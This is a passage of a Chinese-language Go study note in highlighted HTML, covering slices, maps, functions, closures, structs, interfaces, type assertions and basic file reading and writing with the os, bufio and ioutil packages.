keyword">var</span> s1 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>      <span class="token comment" spellcheck="true">//len(s1)=0;cap(s1)=0;s1==nil</span>s2<span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token punctuation">}</span>       <span class="token comment" spellcheck="true">//len(s2)=0;cap(s2)=0;s2!=nil</span>s3<span class="token operator">:=</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//len(s3)=0;cap(s3)=0;s3!=nil</span></code></pre></li></ul></li><li><p>切片的赋值拷贝</p><ul><li><p>下面的代码演示了拷贝前后谱两个切片共享底层数组，对一个切片的修改会影响另一个切片的内容</p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    s1<span class="token operator">:=</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//[0,0,0]</span>    s2<span class="token operator">:=</span>s1  <span class="token comment" spellcheck="true">//将s1的值赋值给s2，两者共用一个底层数组</span>    s2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">100</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[100,0,0]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[100,0,0]</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p><code>copy</code>函数</p><ul><li><p><code>copy</code>函数能迅速的将一个切片的数据复制到另外一个切片空间中</p></li><li><p><code>copy(des,src)</code></p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//copy复制切片</span>    a<span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">}</span>    c<span class="token operator">:=</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//长度必须要足够</span>    <span class="token function">copy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>a<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//[1,2,3,4,5]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//[1,2,3,4,5]</span>    c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1000</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//[1,2,3,4,5]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//[1000,2,3,4,5]</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p><code>append</code>函数</p><ul><li><p>向<code>slice</code>尾部添加数组并返回新的<code>slice</code>对象</p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    s<span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">}</span>    s<span class="token operator">=</span><span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//若s未初始化，append可帮助其初始化</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//[1,2,3]</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p>切片的扩容策略</p><ul><li>首先判断，如果新申请容量（cap）大于2倍的旧容量（old.cap），最终容（newcap）量就是新申请的容量（cap）</li><li>否则判断，如果旧切片的长度小于1024，则最终容量（newcap）就是旧容量（old.cap）的两倍</li><li>否则判断，如果旧切片长度大于等于1024，则最终容量（newcap）从旧容量（old.cap）开始循环增加原来的1/4，直到最终容量（newcap）大于或等于新申请容量（cap）</li><li>如果最终容量（cap）计算值溢出，则最终容量就是新申请容量</li></ul></li></ul><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><ul><li>两个符号<code>&amp;</code>，<code>*</code></li><li><code>Go</code>里面的指针不允许被操作修改（++，–），但可以被重新赋值</li></ul><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><ul><li><code>map</code>存储的是键值对的数据，也需要申请内存</li><li><code>var m1 map[string]int</code>，未分配内存，不可使用</li><li>**<code>make</code>**初始化：<code>m1 = make(map[string]int,30)</code></li><li>如果键值（key）不存在，则取回对应类型（value）的零值（与布尔值）<ul><li>同时取出布尔值：<code>score,ok:=map1[key]</code></li></ul></li><li><code>delete</code>函数<ul><li><code>delete(map1,key)</code></li><li>如果<code>key</code>不存在，则无操作</li></ul></li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li><p><code>Go</code>语言中函数传递的都是值</p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> 函数名<span class="token punctuation">(</span>参数<span class="token punctuation">)</span>返回值<span class="token punctuation">{</span>    函数体<span class="token punctuation">}</span></code></pre></li><li><p>变长函数</p><ul><li><p>变长函数被调用时可以有可变个参数</p></li><li><p>在参数列表最后的类型名称之前使用省略号<code>“...”</code>表示一个变长函数</p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">sum</span><span class="token punctuation">(</span>vals <span class="token operator">...</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    total<span class="token operator">:=</span><span class="token number">0</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span>val <span class="token operator">:=</span> <span class="token keyword">range</span> vals <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//vals在函数体内是一个int类型的切片</span>        total <span class="token operator">+=</span> val    <span class="token punctuation">}</span>    <span class="token keyword">return</span> total<span class="token punctuation">}</span></code></pre></li><li><p>当实参已经存在一个<code>slice</code>之后调用变长函数：在最后一个参数后面放一个省略号</p><ul><li><code>total = sum(values...)</code></li></ul></li></ul></li><li><p>函数进阶</p><ul><li><p>高级函数：函数作为函数参数或返回值</p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">F</span><span class="token punctuation">(</span>Hello<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">F</span><span class="token punctuation">(</span>f <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//func(string)是f的类型</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">Hello</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    f<span class="token operator">:=</span><span class="token function">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token builtin">int</span> <span class="token punctuation">{</span>    f1<span class="token operator">:=</span><span class="token keyword">func</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//函数内部只能定义匿名函数</span>        <span class="token keyword">return</span> x<span class="token operator">+</span>y    <span class="token punctuation">}</span>    <span class="token keyword">return</span> f1<span class="token punctuation">}</span></code></pre></li></ul></li><li><p>闭包</p><ul><li><p>函数和其外部变量的引用</p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">bibao</span><span class="token punctuation">(</span>f <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">f</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p><code>defer</code>延迟调用</p><ul><li>多用于处理资源的释放</li></ul></li><li><p>内置函数</p><ul><li><code>panic</code></li><li><code>recover</code></li></ul></li></ul></li></ul><h1 id="自定义类型和类型别名"><a href="#自定义类型和类型别名" class="headerlink" title="自定义类型和类型别名"></a>自定义类型和类型别名</h1><ul><li><p>自定义类型</p><ul><li><p>定义了一个全新的类型，我们可以基于内置的基本类型定义，也可以通过<code>struct</code>定义</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Myint <span class="token builtin">int</span></code></pre><p>通过<code>type</code>关键字，<code>Myint</code>就是一种全新的类型，它具有<code>int</code>的特性</p></li></ul></li><li><p>类型别名（同一个类型）</p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Yourint <span class="token operator">=</span> <span class="token builtin">int</span></code></pre></li></ul></li></ul><h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><ul><li><p>结构体（值类型）</p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> name <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//content</span><span class="token punctuation">}</span></code></pre></li><li><p>当结构体内部数据首字母大写时，对包外为可见状态</p></li></ul></li><li><p>匿名结构体（多用于临时场景）</p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//content</span>    x <span class="token builtin">int</span>    y <span class="token builtin">int</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//实例化</span></code></pre></li></ul></li><li><p>构造（结构体变量）函数</p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">newPerson</span><span class="token punctuation">(</span>n <span class="token builtin">string</span><span class="token punctuation">,</span>i <span class="token builtin">int</span><span class="token punctuation">)</span> person <span class="token punctuation">{</span>    <span class="token keyword">return</span> person<span class="token punctuation">{</span>        name<span class="token punctuation">:</span> n<span class="token punctuation">,</span>        age<span class="token punctuation">:</span> i<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p><strong>方法</strong>和接收者</p><ul><li><p>方法是有接收者的函数，接收者指的是哪个类型的变量可以调用这个函数</p></li><li><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//接受者使用对应类型首字母小写</span><span class="token keyword">func</span> <span class="token punctuation">(</span>p person<span class="token punctuation">)</span> <span class="token function">dream</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s的梦想是%s"</span>，p<span class="token punctuation">.</span>name<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p>值接收者和指针接收者</p><p>使用指针接受者的情况</p><ul><li>需要更改结构体的值时</li><li>结构体本身比较大，拷贝的内存开销比较大时</li><li>保持一致性，如果有一个方法使用了指针接收者，其他的方法也要使用指针接收者</li></ul></li></ul></li><li><p>结构体的嵌套</p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> addr <span class="token keyword">struct</span><span class="token punctuation">{</span>    province <span class="token builtin">string</span>    city <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">type</span> student <span class="token keyword">struct</span><span class="token punctuation">{</span>    name <span class="token builtin">string</span>    ad addr<span class="token punctuation">}</span></code></pre></li></ul></li><li><p>结构体的匿名字段</p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> addr <span class="token keyword">struct</span><span class="token punctuation">{</span>    province <span class="token builtin">string</span>    city <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">type</span> student <span class="token keyword">struct</span><span class="token punctuation">{</span>    name <span class="token builtin">string</span>    addr <span class="token comment" spellcheck="true">//匿名嵌套结构体</span><span class="token punctuation">}</span></code></pre></li><li><p><code>json</code>序列化与反序列化</p><ul><li>把<code>go</code>语言中结构体变量转换为<code>json</code>格式的字符串</li><li>把<code>json</code>格式到的字符串转换为<code>go</code>语言中能够识别的结构体变量</li></ul></li></ul><h1 id="包（package）"><a href="#包（package）" class="headerlink" title="包（package）"></a>包（package）</h1><ul><li><p>包的定义：<code>package</code>关键字，包名通常和目录名一致，不能包含“<code>_</code>”</p><ul><li>一个文件夹就是一个包</li><li>文件夹里都是<code>.go</code>文件</li></ul></li><li><p>包的导入：<code>import</code></p><ul><li><p>包导入路径：<code>$GOPATH/src</code></p></li><li><p>单行导入</p></li><li><p>多行导入</p></li><li><p>给导入的包起别名</p></li><li><p>匿名导入</p></li></ul></li><li><p>包中<strong>标识符</strong>（变量名、函数名、结构体名、接口名、常量）的可见性：标识符首字母大写</p></li><li><p><code>init()</code></p><ul><li>包导入的时候自动执行</li><li>一个包里只有一个<code>init()</code></li><li><code>init()</code>没有参数叶没有返回值叶不能调用它</li><li>一般用于做一些初始化操作</li></ul></li></ul><h1 id="接口（interface）"><a href="#接口（interface）" class="headerlink" title="接口（interface）"></a>接口（interface）</h1><ul><li><p>接口是一种<strong>类型</strong>，将实现同一种方法的所有类型进行汇总</p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> mover <span class="token keyword">interface</span><span class="token punctuation">{</span>    方法的签名<span class="token punctuation">(</span>参数<span class="token punctuation">)</span><span class="token punctuation">(</span>返回值<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> person <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">type</span> cat <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">type</span> dog <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//接口是一种特殊的类型，它规定了变量有哪些方法</span><span class="token keyword">type</span> Speaker <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//只要实现了speak方法的变量都是speaker类型的变量</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>c cat<span class="token punctuation">)</span> <span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"喵喵喵~"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d dog<span class="token punctuation">)</span> <span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"汪汪汪~"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>p person<span class="token punctuation">)</span> <span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"嘤嘤嘤~"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*发现问题，传入参数的类型不固定*/</span><span class="token keyword">func</span> <span class="token function">da</span><span class="token punctuation">(</span>x Speaker<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//传入一个参数，传进来什么就打什么</span>    x<span class="token punctuation">.</span><span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//挨打了就要叫</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*在编程中，会遇到以下场景：我不关心一个变量是什么类型，我只关心能调用它的什么方法*/</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> c1 cat    <span class="token keyword">var</span> d1 dog    <span class="token keyword">var</span> p1 person    <span class="token function">da</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span>    <span class="token function">da</span><span class="token punctuation">(</span>d1<span class="token punctuation">)</span>    <span class="token function">da</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p>空接口</p><ul><li>任意类型都实现了空接口（“<code>interface{}</code>”）</li><li>用法<ul><li>作为函数参数</li><li><code>map[string]interface{}</code></li></ul></li></ul></li><li><p>类型断言</p><ul><li><p>只能是接口类型</p></li><li><p><code>x.(T)</code>，多用<code>switch</code>来做类型断言</p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> a <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义一个空接口变量</span>    a<span class="token operator">=</span><span class="token number">100</span>    <span class="token comment" spellcheck="true">//x.(T)</span>    <span class="token keyword">if</span> v1<span class="token punctuation">,</span>ok <span class="token operator">:=</span> a<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ok<span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"猜对了"</span><span class="token punctuation">,</span>v1<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"none"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//switch</span>    <span class="token keyword">switch</span> v2<span class="token operator">:=</span>a<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">type</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token builtin">int8</span><span class="token punctuation">:</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"int8"</span><span class="token punctuation">,</span>v2<span class="token punctuation">)</span>    <span class="token keyword">case</span> <span class="token builtin">int16</span><span class="token punctuation">:</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"int16"</span><span class="token punctuation">,</span>v2<span class="token punctuation">)</span>    <span class="token keyword">case</span> <span class="token builtin">int</span><span class="token punctuation">:</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"int"</span><span class="token punctuation">,</span>v2<span class="token punctuation">)</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"none"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><ul><li><p>打开文件和关闭文件</p><ul><li><p><code>os.open</code>打开一个文件（只读文件），返回一个<code>*file</code>和一个<code>error</code>。对得到的文件实例调用<code>close()</code>方法关闭文件</p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fileObj<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"./file.go"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//os.Open与os.Close用来文件的打开和关闭</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//常规语句，用来判断读取文件是否出错</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"open file failed, err=%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//记得关闭文件</span>    <span class="token keyword">defer</span> fileObj<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//读文件</span>    <span class="token comment" spellcheck="true">//var tmp = make([]byte, 128) //指定读的长度</span>    <span class="token keyword">var</span> tmp <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token builtin">byte</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        n<span class="token punctuation">,</span> err <span class="token operator">:=</span> fileObj<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//fileObj.Read把内容读到参数tmp[:]中，返回读取长度与error</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"read from file failed, err:%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"读了%d个字节\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//string()函数，使参数化为string类型</span>        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p>读文件</p><ul><li><p><code>func (f *os.File)Read(b []byte)(n int,err error)</code></p><ul><li>它接收一个字节切片，返回读取的字节数和可能出现的具体错误，读到文件末尾会返回<code>0</code>和<code>io.EOF</code></li></ul></li><li><p><code>bufio</code>利用缓冲区</p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">readFromFilebyBufio</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fileObj<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"./file_2.go"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"open file failed, err=%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//记得关闭文件</span>    <span class="token keyword">defer</span> fileObj<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//创建一个用来从文件中读内容的对象</span>    reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>fileObj<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        line<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//参数是结束符号，返回截止符号前的string与error</span>        <span class="token keyword">if</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"文件读完"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"reader line failed,err:%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">readFromFilebyBufio</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p><code>ioutil</code>包的<code>ReadFile</code>方法能够读取完整的文件，只需要将文件名作为参数传入</p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">readFromFilebyIoutil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//读取整个文件，且无需打开与关闭文件</span>    ret<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"./file_3.go"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回[]byte类型与error</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"read file failed, err:%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">readFromFilebyIoutil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul></li><li><p>写文件</p><ul><li><p><code>os.OpenFile(name string,flag int,perm FileMode)(*File,error)</code></p></li><li><p><img src="/2022/03/10/goNote/image-20210906114630788.png"></p></li><li><p><code>Write</code>和<code>WriteString</code></p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token 